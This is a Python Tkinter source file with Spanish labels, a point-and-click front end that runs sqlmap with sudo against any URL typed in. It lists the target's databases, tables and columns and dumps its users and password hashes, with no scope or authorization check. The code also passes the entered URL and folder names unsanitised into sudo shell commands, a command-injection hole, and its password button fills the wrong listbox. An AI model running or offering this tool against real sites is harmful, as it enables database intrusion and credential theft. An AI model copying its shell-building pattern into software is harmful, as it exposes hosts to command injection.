import tkinter as tk
import tkinter.font as tkFont
from tkinter import ttk
from tkinter import messagebox as tkMessageBox
import subprocess
import socket
import os
import threading
class App:
    def __init__(self, root):
        #setting title
        root.title("SQL Injection")
        #setting window size
        width=861
        height=604
        screenwidth = root.winfo_screenwidth()
        screenheight = root.winfo_screenheight()
        alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
        root.geometry(alignstr)
        root.resizable(width=False, height=False)

        GLabel_442=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        GLabel_442["font"] = ft
        GLabel_442["fg"] = "white"
        GLabel_442["bg"] = "black"
        GLabel_442["justify"] = "center"
        GLabel_442["text"] = "Introduce la URL de la pagina web:"
        GLabel_442.place(x=0,y=20,width=216,height=30)

        self.target = tk.StringVar()
        urlEntry=tk.Entry(root)
        urlEntry["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        urlEntry["font"] = ft
        urlEntry["fg"] = "#333333"
        urlEntry["justify"] = "center"
        urlEntry["text"] = self.target
        urlEntry.place(x=230,y=20,width=100,height=30)

        listarBBDD=tk.Button(root)
        listarBBDD["bg"] = "#f0f0f0"
        ft = tkFont.Font(family='Times',size=10)
        listarBBDD["font"] = ft
        listarBBDD["fg"] = "#000000"
        listarBBDD["justify"] = "center"
        listarBBDD["text"] = "Listar Bases de Datos"
        listarBBDD.place(x=100,y=60,width=150,height=37)
        listarBBDD["command"] = self.listarBBDD_command

        self.listBBDD=tk.Listbox(root)
        self.listBBDD["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        self.listBBDD["font"] = ft
        self.listBBDD["fg"] = "#333333"
        self.listBBDD["justify"] = "center"
        
        self.listBBDD.place(x=20,y=120,width=360,height=135)

        GLabel_506=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        GLabel_506["font"] = ft
        GLabel_506["fg"] = "white"
        GLabel_506["bg"] = "black"
        GLabel_506["justify"] = "center"
        GLabel_506["text"] = "Una vez cargadas las bases de datos puedes seleccionar la que quieres usar"
        GLabel_506.place(x=0,y=90,width=429,height=30)

        listarTablas=tk.Button(root)
        listarTablas["bg"] = "#f0f0f0"
        ft = tkFont.Font(family='Times',size=10)
        listarTablas["font"] = ft
        listarTablas["fg"] = "#000000"
        listarTablas["justify"] = "center"
        listarTablas["text"] = "Listar Tablas"
        listarTablas.place(x=80,y=260,width=192,height=30)
        listarTablas["command"] = self.listarTablas_command

        self.listTable=tk.Listbox(root)
        self.listTable["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        self.listTable["font"] = ft
        self.listTable["fg"] = "#333333"
        self.listTable["justify"] = "center"
        self.listTable.place(x=20,y=320,width=312,height=127)

        GLabel_250=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        GLabel_250["font"] = ft
        GLabel_250["fg"] = "white"
        GLabel_250["bg"] = "black"
        GLabel_250["justify"] = "center"
        GLabel_250["text"] = "Una vez cargadas las tablas puedes seleccionar la que quieres usar"
        GLabel_250.place(x=0,y=290,width=379,height=34)

        listarColumnas=tk.Button(root)
        listarColumnas["bg"] = "#f0f0f0"
        ft = tkFont.Font(family='Times',size=10)
        listarColumnas["font"] = ft
        listarColumnas["fg"] = "#000000"
        listarColumnas["justify"] = "center"
        listarColumnas["text"] = "Listar Columnas"
        listarColumnas.place(x=80,y=450,width=175,height=30)
        listarColumnas["command"] = self.listarColumnas_command

        self.listColmn=tk.Listbox(root)
        self.listColmn["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        self.listColmn["font"] = ft
        self.listColmn["fg"] = "#333333"
        self.listColmn["justify"] = "center"
        self.listColmn.place(x=20,y=490,width=310,height=94)

        listarPasswd=tk.Button(root)
        listarPasswd["bg"] = "#f0f0f0"
        ft = tkFont.Font(family='Times',size=10)
        listarPasswd["font"] = ft
        listarPasswd["fg"] = "#000000"
        listarPasswd["justify"] = "center"
        listarPasswd["text"] = "Listar Contraseñas"
        listarPasswd.place(x=540,y=150,width=144,height=34)
        listarPasswd["command"] = self.listarPasswd_command

        GLabel_266=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        GLabel_266["font"] = ft
        GLabel_266["fg"] ="white"
        GLabel_266["bg"] = "black"
        GLabel_266["justify"] = "center"
        GLabel_266["text"] = "Nombra de la carpeta donde se van a guardar todos los datos:"
        GLabel_266.place(x=340,y=20,width=374,height=30)

        self.carpeta = tk.StringVar()
        carpetaEntry=tk.Entry(root)
        carpetaEntry["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        carpetaEntry["font"] = ft
        carpetaEntry["fg"] = "#333333"
        carpetaEntry["justify"] = "center"
        carpetaEntry["text"] = self.carpeta
        carpetaEntry.place(x=720,y=20,width=117,height=30)

        crearCarpeta=tk.Button(root)
        crearCarpeta["bg"] = "#f0f0f0"
        ft = tkFont.Font(family='Times',size=10)
        crearCarpeta["font"] = ft
        crearCarpeta["fg"] = "#000000"
        crearCarpeta["justify"] = "center"
        crearCarpeta["text"] = "Crear Carpeta"
        crearCarpeta.place(x=540,y=60,width=144,height=34)
        crearCarpeta["command"] = self.crearCarpeta_command

        self.listaPasswd=tk.Listbox(root)
        self.listaPasswd["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        self.listaPasswd["font"] = ft
        self.listaPasswd["fg"] = "#333333"
        self.listaPasswd["justify"] = "center"
        self.listaPasswd.place(x=480,y=190,width=265,height=133)

        listarUser=tk.Button(root)
        listarUser["bg"] = "#f0f0f0"
        ft = tkFont.Font(family='Times',size=10)
        listarUser["font"] = ft
        listarUser["fg"] = "#000000"
        listarUser["justify"] = "center"
        listarUser["text"] = "Listar Usuarios"
        listarUser.place(x=540,y=330,width=148,height=32)
        listarUser["command"] = self.listarUser_command

        self.listaUser=tk.Listbox(root)
        self.listaUser["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        self.listaUser["font"] = ft
        self.listaUser["fg"] = "#333333"
        self.listaUser["justify"] = "center"
        self.listaUser.place(x=480,y=365,width=269,height=114)

    def listarBBDD_command(self):
        target = self.target.get()
        web = target.split("/")
        self.lista = []
        cont=0
        os.system("sudo sqlmap -u "+target+" --dbs --batch --output-dir=App/sqlArchives/"+self.carpeta.get()+"/BaseDatos")
        with open('App/sqlArchives/'+self.carpeta.get()+'/BaseDatos/'+web[2]+'/log', 'r') as f:
            for line in f:
                if line[0] == "[" :
                    print(line)
                    print(tuple(line))
                    line1=line.replace(' ','')
                    line1=line1.replace('\n','')
                    self.lista.append(line1.replace('[*]',''))
                    cont=cont+1
                
        self.listBBDD["listvariable"] = tk.Variable(value=self.lista)
        


    def listarTablas_command(self):
        target = self.target.get()
        web = target.split("/")
        print(web[2])
        self.lista = []
        self.lastBD = self.listBBDD.get(self.listBBDD.curselection()[0])
        cont=0
        os.system("sudo sqlmap -u "+target+" -D "+self.listBBDD.get(self.listBBDD.curselection()[0])+" --tables --batch --output-dir=App/sqlArchives/"+self.carpeta.get()+"/Tablas")
        with open('App/sqlArchives/'+self.carpeta.get()+'/Tablas/'+web[2]+'/log', 'r') as f:
            for line in f:
                if line[0] == "|" :
                    print(line)
                    print(tuple(line))
                    line1=line.replace(' ','')
                    line1=line1.replace('\n','')
                    self.lista.append(line1.replace('|',''))
                    cont=cont+1
        self.listTable["listvariable"] = tk.Variable(value=self.lista)


    def listarColumnas_command(self):
        target = self.target.get()
        web = target.split("/")
        self.lista = []
        cont=0
        os.system("sudo sqlmap -u "+target+" -D "+self.lastBD+" -T "+self.listTable.get(self.listTable.curselection()[0])+" --columns --batch --output-dir=App/sqlArchives/"+self.carpeta.get()+"/Columnas")
        with open('App/sqlArchives/'+self.carpeta.get()+'/Columnas/'+web[2]+'/log', 'r') as f:
            for line in f:
                if line[0] == "|" :
                    print(line)
                    print(tuple(line))
                    line1=line.replace(' ','')
                    line1=line1.replace('\n','')
                    self.lista.append(line1.replace('|',''))
                    cont=cont+1
        self.listColmn["listvariable"] = tk.Variable(value=self.lista)


    def listarPasswd_command(self):
        target = self.target.get()
        self.lista = []
        web = target.split("/")
        cont=0
        os.system("sudo sqlmap -u "+target+" --passwords --batch --output-dir=App/sqlArchives/"+self.carpeta.get()+"/Passwd")
        with open('App/sqlArchives/'+self.carpeta.get()+'/Passwd/'+web[2]+'/log', 'r') as f:
            for line in f:
                if line[0] == "|" :
                    print(line)
                    print(tuple(line))
                    line1=line.replace(' ','')
                    line1=line1.replace('\n','')
                    self.lista.append(line1.replace('|',''))
                    cont=cont+1
                
        self.listaUser["listvariable"] = tk.Variable(value=self.lista)
    
    def crearCarpeta_command(self):
        carpeta = self.carpeta.get()
        os.mkdir(path="App/sqlArchives/{}".format(carpeta))


    def listarUser_command(self):
        target = self.target.get()
        self.lista = []
        web = target.split("/")
        cont=0
        os.system("sudo sqlmap -u "+target+" --users --batch --output-dir=App/sqlArchives/"+self.carpeta.get()+"/User")
        with open('App/sqlArchives/'+self.carpeta.get()+'/User/'+web[2]+'/log', 'r') as f:
            for line in f:
                if line[0] == "[" :
                    print(line)
                    print(tuple(line))
                    line1=line.replace(' ','')
                    line1=line1.replace('\n','')
                    self.lista.append(line1.replace('[*]',''))
                    cont=cont+1
                
        self.listaUser["listvariable"] = tk.Variable(value=self.lista)

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.config(bg="black")
    root.mainloop()
